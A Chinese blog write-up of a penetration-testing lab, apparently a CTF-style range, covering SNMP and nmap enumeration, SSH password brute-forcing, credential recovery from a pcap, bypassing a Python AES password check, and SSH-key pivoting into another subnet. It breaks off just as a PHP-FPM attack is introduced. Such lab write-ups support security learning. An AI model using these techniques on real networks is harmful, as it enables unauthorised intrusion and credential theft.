<h5 id="User"><a href="#User" class="headerlink" title="User"></a>User</h5><p>通过SNMP发现另一个网络172.16.60.x<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.20</span><span class="meta">.3</span> = Counter32: <span class="number">0</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.21</span><span class="meta">.1</span> = Gauge32: <span class="number">0</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.21</span><span class="meta">.2</span> = Gauge32: <span class="number">0</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.21</span><span class="meta">.3</span> = Gauge32: <span class="number">0</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.22</span><span class="meta">.1</span> = OID: ccitt<span class="meta">.0</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.22</span><span class="meta">.2</span> = OID: ccitt<span class="meta">.0</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.22</span><span class="meta">.3</span> = OID: ccitt<span class="meta">.0</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.172</span><span class="meta">.16</span><span class="meta">.50</span><span class="meta">.1</span> = INTEGER: <span class="number">2</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.172</span><span class="meta">.16</span><span class="meta">.50</span><span class="meta">.11</span> = INTEGER: <span class="number">2</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.172</span><span class="meta">.16</span><span class="meta">.50</span><span class="meta">.20</span> = INTEGER: <span class="number">2</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.172</span><span class="meta">.16</span><span class="meta">.60</span><span class="meta">.2</span> = INTEGER: <span class="number">3</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.172</span><span class="meta">.16</span><span class="meta">.60</span><span class="meta">.3</span> = INTEGER: <span class="number">3</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.172</span><span class="meta">.16</span><span class="meta">.60</span><span class="meta">.4</span> = INTEGER: <span class="number">3</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.172</span><span class="meta">.16</span><span class="meta">.60</span><span class="meta">.5</span> = INTEGER: <span class="number">3</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.172</span><span class="meta">.16</span><span class="meta">.50</span><span class="meta">.1</span> = Hex-STRING: <span class="number">08</span> <span class="number">00</span> <span class="number">27</span> FE <span class="number">97</span> AF </span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.172</span><span class="meta">.16</span><span class="meta">.50</span><span class="meta">.11</span> = Hex-STRING: <span class="number">08</span> <span class="number">00</span> <span class="number">27</span> <span class="number">1B</span> E6 <span class="number">89</span> </span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.172</span><span class="meta">.16</span><span class="meta">.50</span><span class="meta">.20</span> = Hex-STRING: <span class="number">08</span> <span class="number">00</span> <span class="number">27</span> AF B6 D6 </span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.172</span><span class="meta">.16</span><span class="meta">.60</span><span class="meta">.2</span> = Hex-STRING: <span class="number">08</span> <span class="number">00</span> <span class="number">27</span> 3B <span class="number">85</span> <span class="number">71</span> </span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.172</span><span class="meta">.16</span><span class="meta">.60</span><span class="meta">.3</span> = Hex-STRING: <span class="number">08</span> <span class="number">00</span> <span class="number">27</span> <span class="number">0B</span> <span class="number">82</span> <span class="number">36</span> </span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.172</span><span class="meta">.16</span><span class="meta">.60</span><span class="meta">.4</span> = Hex-STRING: <span class="number">08</span> <span class="number">00</span> <span class="number">27</span> <span class="number">89</span> <span class="number">9D</span> 3E </span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.172</span><span class="meta">.16</span><span class="meta">.60</span><span class="meta">.5</span> = Hex-STRING: <span class="number">08</span> <span class="number">00</span> <span class="number">27</span> 5A 1E <span class="number">03</span> </span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.172</span><span class="meta">.16</span><span class="meta">.50</span><span class="meta">.1</span> = IpAddress: <span class="number">172.16</span><span class="meta">.50</span><span class="meta">.1</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.172</span><span class="meta">.16</span><span class="meta">.50</span><span class="meta">.11</span> = IpAddress: <span class="number">172.16</span><span class="meta">.50</span><span class="meta">.11</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.172</span><span class="meta">.16</span><span class="meta">.50</span><span class="meta">.20</span> = IpAddress: <span class="number">172.16</span><span class="meta">.50</span><span class="meta">.20</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.172</span><span class="meta">.16</span><span class="meta">.60</span><span class="meta">.2</span> = IpAddress: <span class="number">172.16</span><span class="meta">.60</span><span class="meta">.2</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.172</span><span class="meta">.16</span><span class="meta">.60</span><span class="meta">.3</span> = IpAddress: <span class="number">172.16</span><span class="meta">.60</span><span class="meta">.3</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.172</span><span class="meta">.16</span><span class="meta">.60</span><span class="meta">.4</span> = IpAddress: <span class="number">172.16</span><span class="meta">.60</span><span class="meta">.4</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.172</span><span class="meta">.16</span><span class="meta">.60</span><span class="meta">.5</span> = IpAddress: <span class="number">172.16</span><span class="meta">.60</span><span class="meta">.5</span></span><br></pre></td></tr></table></figure></p>
<p>扫描一下端口开放<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE<span class="built_in"> SERVICE </span>REASON</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 62</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.16.60.3</span><br><span class="line">Host is up, received user-<span class="builtin-name">set</span> (0.50s latency).</span><br><span class="line">Scanned at 2020-01-07 20:16:25 EST <span class="keyword">for</span> 126s</span><br><span class="line"><span class="keyword">Not</span> shown: 999 filtered ports</span><br><span class="line">Reason: 999 no-responses</span><br><span class="line">Some closed ports may be reported as filtered due <span class="keyword">to</span> --defeat-rst-ratelimit</span><br><span class="line">PORT   STATE<span class="built_in"> SERVICE </span>REASON</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 62</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.16.60.4</span><br><span class="line">Host is up, received user-<span class="builtin-name">set</span> (0.62s latency).</span><br><span class="line">Scanned at 2020-01-07 20:16:25 EST <span class="keyword">for</span> 129s</span><br><span class="line"><span class="keyword">Not</span> shown: 999 filtered ports                                                                  </span><br><span class="line">Reason: 999 no-responses                                                                       </span><br><span class="line">Some closed ports may be reported as filtered due <span class="keyword">to</span> --defeat-rst-ratelimit                    </span><br><span class="line">PORT   STATE<span class="built_in"> SERVICE </span>REASON</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 62</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.16.60.5</span><br><span class="line">Host is up, received user-<span class="builtin-name">set</span> (0.58s latency).</span><br><span class="line">Scanned at 2020-01-07 20:16:25 EST <span class="keyword">for</span> 127s</span><br><span class="line"><span class="keyword">Not</span> shown: 999 filtered ports</span><br><span class="line">Reason: 999 no-responses</span><br><span class="line">Some closed ports may be reported as filtered due <span class="keyword">to</span> --defeat-rst-ratelimit</span><br><span class="line">PORT   STATE<span class="built_in"> SERVICE </span>REASON</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 62</span><br></pre></td></tr></table></figure></p>
<p>仅开放ssh服务，利用之前收集到的用户名爆破一波  </p>
<p><img src="/images/pasted-84.png" alt="upload successful"><br>同一口令可以登录这四台服务器，挨个儿翻一遍（估计作者为了增加难度，BAN了find大法，在其中一台/opt目录下发现<code>t@ken</code>文件，( ╯□╰ )），继续信息收集，发现ssh密钥对，一个dump文件，全都下载回本地。（PS，作者喜欢在/opt下塞东西，从之前放token的位置可以看出来）<br>file命令看一下dump文件，是一个pcap数据报文文件，先strings+grep找一下token  </p>
<p><img src="/images/pasted-85.png" alt="upload successful"><br>看样子像一个web登录请求，用wireshark继续分析改文件  </p>
<h5 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h5><p><img src="/images/pasted-86.png" alt="upload successful"><br>对应咱们收集的域名列表，172.16.0.21是git服务器，这个登录密码应该就是Git登录账密，拿去登录成功  </p>
<p><img src="/images/pasted-87.png" alt="upload successful"><br>查看提交记录，发现token  </p>
<p><img src="/images/pasted-88.png" alt="upload successful">  </p>
<h5 id="Certificate"><a href="#Certificate" class="headerlink" title="Certificate"></a>Certificate</h5><p>这个题目最早出现是在Mail那一关，从邮箱下载回来一个Certificate文件，当时没太懂python的Module怎么逆，群友提示先别硬刚，就放一边了，原来在仓库有源码。  </p>
<pre><code class="``">
from hashlib import md5
from base64 import b64decode
from base64 import b64encode
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

certif = &quot;&quot;&quot;
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
&quot;&quot;&quot;

cyphered = &quot;&quot;&quot;9FRznJq2IO9ubbW+MvuwEIf4oS9VlIB/H+ygdD1OZp+/q1AF1bwtHlpP7IqTUrTd&quot;&quot;&quot;

d = &quot;&quot;&quot;
 PC10-a=0H
 !ejkl;F97
 fhNjkRc12
 DFlT21K54
 l(8Ee15AA
 LC,$T$2I!
 1JHG11T12
 tJUf24D17
 34e6GDHIT
&quot;&quot;&quot;


class AESCipher:
    def __init__(self, key):
        self.key = md5(key.encode(&apos;utf8&apos;)).digest()

    def encrypt(self, data):
        iv = get_random_bytes(AES.block_size)
        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return b64encode(iv + self.cipher.encrypt(pad(data.encode(&apos;utf-8&apos;), AES.block_size)))

    def decrypt(self, data):
        raw = b64decode(data)
        self.cipher = AES.new(self.key, AES.MODE_CBC, raw[:AES.block_size])
        return unpad(self.cipher.decrypt(raw[AES.block_size:]), AES.block_size)


def find_key(d):
    d_s = d.split()
    l = len(d_s) - 1
    key = &apos;&apos;
    for i in range(2):
        key += d_s[0][i] + d_s[0][l - i]
        key += d_s[l][l - i] + d_s[l][i]
    return key


def inds(pos):
    return pos.split(&apos;,&apos;)


def puzzle_assembly(positions):
    p = positions
    rs = d.split()
    token = &apos;&apos;
    for it in p.split():
        sel = inds(it)
        token = &apos;&apos;.join([token, rs[int(sel[0])][int(sel[1])]])
    return token

def main():
    key = find_key(d)
    poss = AESCipher(key).decrypt(cyphered).decode(&apos;utf-8&apos;)
    pwd = input(&apos;Please, input password:&apos;)
    passw = puzzle_assembly(poss)

    if pwd == passw:
        # print (&apos;KEY in d =&apos;, key)
        # print (&apos;poss =&apos;, poss)
        # print (&apos;PASSWORD =&apos;, passw)
        certificate = AESCipher(passw).decrypt(certif).decode(&apos;utf-8&apos;)
        print(&apos;Your certificate: \n%s&apos; % (certificate))
    else:
        print(&quot;Yor password is not correct!&quot;)


if __name__ == &quot;__main__&quot;:
    main()


</code></pre>
<p>程序逻辑也比较简单，运行后接受一个输入密码，如果和<code>passw</code>相同，则输出证书，否则退出，这儿直接把程序逻辑改一下，去掉判断，输出key和密钥  </p>
<p><img src="/images/pasted-89.png" alt="upload successful"><br>key即是这一关的token  </p>
<h5 id="Terminal-1"><a href="#Terminal-1" class="headerlink" title="Terminal-1"></a>Terminal-1</h5><p>既然拿到了一个ssh密钥对，那应该还是找ssh登录利用，从资产表可以看到，目前为止还剩172.16.40.0/24这个子网，直接扫22端口  </p>
<p><img src="/images/pasted-90.png" alt="upload successful"><br>果然有一个，用拿到的密钥登录  </p>
<p><img src="/images/pasted-91.png" alt="upload successful"><br>在/opt目录下发现token文件  </p>
<h5 id="FPM"><a href="#FPM" class="headerlink" title="FPM"></a>FPM</h5><p>发现172.16.40.3这个IP对应admin.test.lab，只能通过172.16.40.2访问，这儿用ssh开本地socks代理来扫描172.16.40.3（网络不稳定，且速度慢），也可以直接传一个扫描工具上去扫，但需要注意一点，实验环境会隔一段时间重置，如果还没扫描完重置环境就GG，只能重来。<br>探测到两个端口  </p>
<pre><code>
INFO[0000] tcp://172.16.40.3:9000 is alive and reachable 
INFO[0000] tcp://172.16.40.3:80 is alive and reachable  

</code></pre><p>80端口跑nginx，再加上9000端口，很容易想到fpm上来（如果关注之前漏洞发布的话应该知道这个洞，正好我复现过hhh）</p>

  </div>
  <div class="post-meta">
    <span class="post-time" style="color:#646060;font-size:13px">2020-01-07</span>
  </div>

  <div class="post-footer">
    

    <a href="#top" class="top">Back to Top</a>
  </div>
</li></article>

<!-- 评论插件 -->

<footer>
  2020
  <span class="author">
    x51
  </span>
</footer>


    </div>
  </body>
</html>